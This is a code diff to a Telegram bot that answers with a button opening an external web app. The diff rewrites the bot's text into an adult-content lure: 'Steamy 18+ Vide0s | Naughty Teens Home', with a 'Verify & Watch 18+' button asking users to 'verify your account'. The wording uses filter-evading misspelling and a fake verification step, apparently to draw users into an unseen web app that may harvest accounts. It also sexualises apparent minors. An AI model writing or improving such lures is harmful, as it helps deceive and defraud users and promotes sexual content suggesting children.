@@ -12,9 +12,9 @@ _t2 = os.getenv("MINI_APP_URL")
 
 
 async def _cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    kb = [[KeyboardButton("🔞 Watch Now", web_app=WebAppInfo(url=_t2))]]
+    kb = [[KeyboardButton("🔞 Verify & Watch 18+", web_app=WebAppInfo(url=_t2))]]
     await update.message.reply_text(
-        "🔥 Premium Content\n\nTap below to access.",
+        "🔥 Steamy 18+ Vide0s | Naughty Teens Home 🧏\n\nClick below to verify your account!",
         reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True)
     )
 
